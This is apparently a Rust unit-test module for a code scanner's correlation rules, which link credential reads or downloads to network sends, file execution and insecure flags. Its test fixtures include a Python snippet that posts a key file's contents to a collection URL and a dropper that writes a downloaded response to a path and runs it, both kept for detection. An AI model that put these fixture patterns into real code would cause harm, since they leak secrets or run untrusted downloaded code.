    /// response into the handle — the opposite direction to exfiltration, and
    /// not a chain (it was one while write handles were bound).
    #[test]
    fn a_write_handle_is_not_a_source_of_data() {
        let src = "    with open(os.path.expanduser(NETRC), 'w') as netrc_file:\n        resp = post(LOGIN_URL, json=creds)\n        netrc_file.write(resp.json()['token'])\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-031", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
        // The same line opened for reading yields the file's contents, and
        // sending them is the chain.
        let read = "    with open(os.path.expanduser(KEYFILE)) as key_file:\n        post(COLLECT_URL, data=key_file.read())\n";
        let lines_r: Vec<&str> = read.lines().collect();
        assert_eq!(apply(&[rule()], &findings, &lines_r).len(), 1);
    }

    fn launch_rule() -> CorrelationRule {
        CorrelationRule {
            id: "DROPPER-CHAIN-001".to_string(),
            severity: "high".to_string(),
            description: "Downloaded file is executed".to_string(),
            weight: Some(5),
            source: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-002".to_string()],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["CODE-RUNFILE-001".to_string()],
            },
            sink_excludes: vec![],
            ..rule()
        }
    }

    /// A sink that runs a file links only through a file the source wrote:
    /// downloaded *data* handed to a local script is that script's input, not
    /// the program that runs.
    #[test]
    fn a_launch_links_only_through_a_written_file() {
        let data = "data = get(JOBS_URL).json()\nfor job in data:\n    print(job)\nproc = run([interp, helper_script],\n           input=dumps(data))\n";
        let lines: Vec<&str> = data.lines().collect();
        let findings = vec![f("NET-001", 1), f("CODE-RUNFILE-001", 4)];
        assert!(apply(&[launch_rule()], &findings, &lines).is_empty());
        // The download writes PATH and the launch runs PATH: the chain.
        let dropper = "with urlopen(req) as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\nrun([interp, PATH])\n";
        let lines_d: Vec<&str> = dropper.lines().collect();
        let findings_d = vec![f("NET-002", 1), f("CODE-RUNFILE-001", 3)];
        assert_eq!(apply(&[launch_rule()], &findings_d, &lines_d).len(), 1);
        // The response handle reaching the launch's arguments is not a link.
        let handle = "with urlopen(req) as response:\n    pass\nrun([interp, helper_script], input=response.read())\n";
        let lines_h: Vec<&str> = handle.lines().collect();
        assert!(apply(&[launch_rule()], &findings_d, &lines_h).is_empty());
    }

    /// A rule whose sink is a keyword argument on its own line at the end of
    /// a multi-line call, like the insecure-transport chain.
    fn above_rule() -> CorrelationRule {
        CorrelationRule {
            id: "ABOVE-CHAIN".to_string(),
            severity: "high".to_string(),
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["KWARG-001".to_string()],
            },
            sink_window_before: 5,
            sink_excludes: vec![],
            ..rule()
        }
    }

    #[test]
    fn a_window_above_the_sink_reaches_the_call_arguments() {
        // The token is bound on line 1 and used on line 4; the sink is the
        // keyword argument on line 6. Only a window above the sink sees it:
        // lines 2-5 continue into line 6 (the call's opening line and its
        // earlier arguments), line 1 is a complete statement.
        let src = "token = read_secret()\nresp = client.post(\n    url,\n    headers=auth(token),\n    timeout=5,\n    flag=off,\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 6)];
        let chains = apply(&[above_rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].line, Some(6));
        // With the default window (nothing above the sink) there is no link.
        let below_only = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[below_only], &findings, &lines).is_empty());
    }

    #[test]
    fn a_statement_above_the_sink_is_not_one_of_its_arguments() {
        // The source line sits a few lines above the sink and repeats its own
        // binding; nothing else uses the name.
        let src = "token = read_secret()\nlog(\"start\")\nping(status_url, flag=off)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        // The key is used on the line above, but by a different, complete
        // call: the insecure call below never sees it. (This linked, at
        // High, while the window above was a fixed five lines.)
        let other_call =
            "api_key = read_secret()\nclient = Vendor(api_key=api_key)\nstatus = ping(status_url, flag=off)\n";
        let lines_o: Vec<&str> = other_call.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines_o).is_empty());
        // The same for a JavaScript statement ending in `;`.
        let js = "const token = readSecret();\nconst gh = new Octokit({ auth: token });\nconst agent = makeAgent({ flag: off });\n";
        let lines_j: Vec<&str> = js.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines_j).is_empty());
    }

    #[test]
    fn a_source_inside_the_call_links_without_a_name() {
        // The credential is read inline, in the headers argument of the call
        // whose last argument is the sink: no name to carry, same call.
        let src = "resp = client.post(\n    url,\n    headers={\"Authorization\": read_secret()},\n    flag=off,\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 3), f("KWARG-001", 4)];
        let chains = apply(&[above_rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L3) reaches KWARG-001 (@L4)"));
        // A source line above the call is not inside it.
        let above = "headers = {\"Authorization\": read_secret()}\nresp = client.post(\n    url,\n    flag=off,\n)\n";
        let lines_a: Vec<&str> = above.lines().collect();
        let findings_a = vec![f("CRED-012", 1), f("KWARG-001", 4)];
        assert!(apply(&[above_rule()], &findings_a, &lines_a).is_empty());
        // Without a window above, the call's other arguments are not read.
        let below_only = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[below_only], &findings, &lines).is_empty());
    }

    #[test]
    fn set_up_above_and_use_below_join_the_statement() {
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        // A headers dict built from the key, then passed to the call.
        let dict = "token = read_secret()\nheaders = {\"Authorization\": token}\nresp = get(url, headers=headers, flag=off)\n";
        let lines: Vec<&str> = dict.lines().collect();
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        // A session configured with the key, then used for the call.
        let session = "token = read_secret()\nsession.headers.update({\"Authorization\": token})\nr = session.get(url, flag=off)\n";
        let lines: Vec<&str> = session.lines().collect();
        // `session` is not assigned in the window: an unknown name, maybe a
        // module, and not read.
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        let session = "token = read_secret()\nsession = Session()\nsession.headers.update({\"Authorization\": token})\nr = session.get(url, flag=off)\n";
        let lines: Vec<&str> = session.lines().collect();
        let findings_s = vec![f("CRED-012", 1), f("KWARG-001", 4)];
        assert_eq!(apply(&[above_rule()], &findings_s, &lines).len(), 1);
        // An attribute of `self` is the object's own state.
        let attr = "self.token = read_secret()\nself.session.headers[\"A\"] = self.token\nself.session.flag = off\n";
        let lines: Vec<&str> = attr.lines().collect();
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        // A module used for another call above is not the insecure call's
        // set-up.
        let module = "token = read_secret()\nhttp.post(api, headers={\"A\": token})\nhttp.get(status_url, flag=off)\n";
        let lines: Vec<&str> = module.lines().collect();
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        // Below: the agent the statement builds is used with the key.
        let agent = "const token = readSecret();\nconst agent = makeAgent({ flag: off });\nfetch(url, { agent, headers: { A: token } });\n";
        let lines: Vec<&str> = agent.lines().collect();
        let findings_a = vec![f("CRED-012", 1), f("KWARG-001", 2)];
        assert_eq!(apply(&[above_rule()], &findings_a, &lines).len(), 1);
        // ... but a line below that does not use the agent is another
        // statement.
        let other = "const token = readSecret();\nconst agent = makeAgent({ flag: off });\nconst gh = new Octokit({ auth: token });\n";
        let lines: Vec<&str> = other.lines().collect();
        assert!(apply(&[above_rule()], &findings_a, &lines).is_empty());
        // A source below the sink inside the same call.
        let below =
            "resp = post(\n    url,\n    flag=off,\n    headers={\"A\": read_secret()},\n)\n";
        let lines: Vec<&str> = below.lines().collect();
        let findings_b = vec![f("CRED-012", 4), f("KWARG-001", 3)];
        assert_eq!(apply(&[above_rule()], &findings_b, &lines).len(), 1);
        // For a rule without a window above, the order rule still applies.
        let legacy = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[legacy], &findings_b, &lines).is_empty());
    }

    #[test]
    fn leading_and_assigned_names() {
        assert_eq!(leading_name("const agent = x;"), Some(("agent", false)));
        assert_eq!(
            leading_name("    self.session.headers.update(h)"),
            Some(("session", true))
        );
        assert_eq!(leading_name("  requests.get(u)"), Some(("requests", false)));
        assert_eq!(leading_name("  )"), None);
        assert_eq!(
            assigned_name("session.headers[\"A\"] = t"),
            Some(("session", false))
        );
        assert_eq!(assigned_name("tr := &http.Transport{"), Some(("tr", false)));
        assert_eq!(
            assigned_name("let mut c: Client = build();"),
            Some(("c", false))
        );
        assert_eq!(assigned_name("this.agent = a;"), Some(("agent", true)));
        assert_eq!(assigned_name("if session.verify == False:"), None);
        assert_eq!(assigned_name("requests.get(url, flag=off)"), None);
    }

    #[test]
    fn a_long_line_is_not_linked_when_the_rule_caps_it() {
        // One minified line holds a credential read and the insecure flag
        // far apart: a same-line link says nothing there.
        let bundle = format!(
            "var t=read_secret();{}var a=makeAgent({{flag:off}});",
            "function p(){return 0}".repeat(40)
        );
        let lines = vec![bundle.as_str()];
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 1)];
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        let capped = CorrelationRule {
            max_line_length: 500,
            ..above_rule()
        };
        assert!(apply(std::slice::from_ref(&capped), &findings, &lines).is_empty());
        // A short line under the cap still links on the same line.
        let short = ["resp = client.post(url, headers=auth(read_secret()), flag=off)"];
        assert_eq!(apply(&[capped], &findings, &short).len(), 1);
    }

    #[test]
    fn continuation_block_and_window() {
        // A black-formatted call: the run above the sink is the call.
        let call = [
            "token = read_secret()",
            "resp = client.get(",
            "    url,  # the endpoint",
            "    headers=auth(token),",
            "    flag=off,",
            ")",
            "after()",
        ];
        assert_eq!(continuation_start(&call, 5, 10), 2);
        assert_eq!(continuation_start(&call, 5, 2), 3, "bounded by `before`");
        assert_eq!(continuation_start(&call, 5, 0), 5);
        let s = statement_scope(&call, 5, 10);
        assert_eq!((s.start, s.end), (2, 6));
        // Line 1 assigns `token`, a local the call uses: set-up, kept.
        assert_eq!(
            s.text,
            "token = read_secret()\nresp = client.get(\n    url,  # the endpoint\n    headers=auth(token),\n    flag=off,\n)"
        );
        // `after()` does not use `resp`, the name the statement binds.
        assert!(!s.text.contains("after"));
        assert_eq!(arg_window(&call, 5), "    flag=off,\n)\nafter()");
        assert_eq!(arg_window(&call, 0), "");
        assert_eq!(arg_window(&call, 20), "");
        assert_eq!(statement_scope(&call, 0, 5).text, "");
        assert_eq!(statement_scope(&call, 20, 5).text, "");
        // Object literals continue; blocks do not.
        for open in [
            "const options = {",
            "  headers: {",
            "new https.Agent({",
            "tr := &http.Transport{",
            "  return {",
            "{",
            "items = [",
            "x = f(a, \\",
        ] {
            assert!(continues_into_next(open), "{open}");
        }
        for stmt in [
            "function makeAgent(token) {",
            "const f = () => {",
            "class Client {",
            "} else {",
            "func newClient() *http.Client {",
            "client = Vendor(api_key=api_key)",
            "const gh = new Octokit({ auth: token });",
            "def fetch(url, token):",
            "",
            "headers = {\"X\": \"a\"}  # trailing, comment,",
        ] {
            assert!(!continues_into_next(stmt), "{stmt}");
        }
        assert_eq!(strip_trailing_comment("a,  // b,"), "a, ");
        assert_eq!(
            strip_trailing_comment("u = \"https://x/#y\","),
            "u = \"https://x/#y\","
        );
        assert_eq!(
            strip_trailing_comment("this.#agent = x,"),
            "this.#agent = x,"
        );
    }

    #[test]
    fn contains_word_is_whole_word() {
        assert!(contains_word("json={\"k\": api_key}", "api_key"));
        assert!(!contains_word("json={\"k\": api_key2}", "api_key"));
        assert!(!contains_word("my_api_key", "api_key"));
    }
}
